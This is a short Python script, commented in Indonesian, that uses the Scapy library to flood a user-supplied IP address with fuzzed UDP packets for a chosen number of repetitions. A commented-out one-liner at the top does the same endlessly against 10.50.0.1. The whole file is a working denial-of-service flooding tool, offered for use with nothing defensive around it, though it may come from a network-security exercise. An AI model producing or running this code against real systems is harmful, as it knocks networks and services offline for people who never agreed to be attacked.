#-----------------------------------------------
# from scapy.all import *

# send(IP(dst="10.50.0.1")/fuzz(UDP()),loop=1)
#-----------------------------------------------


# Mengimpor library
from scapy.all import *

# Sebuah fungsi untuk menampung proses
def udp_flood():
    # Menginisialisasikan variabel untuk memasukkan alamat IP target
    target = str(input("Enter IP address of target >> "))
    
    # Menginisialisasikan variabel untuk memasukkan jumlah serangan yang diulang
    loop = int(input("Enter loop of attack >> "))
    
    # Proses pengiriman paket bersamaan dengan proses pembentukkan paket
    send(IP(dst = target) / fuzz(UDP()), loop = loop)
    
# Pengkondisian if untuk menjalankan program
if __name__ == "__main__":
    udp_flood() # Memanggil fungsi untuk menjalankan proses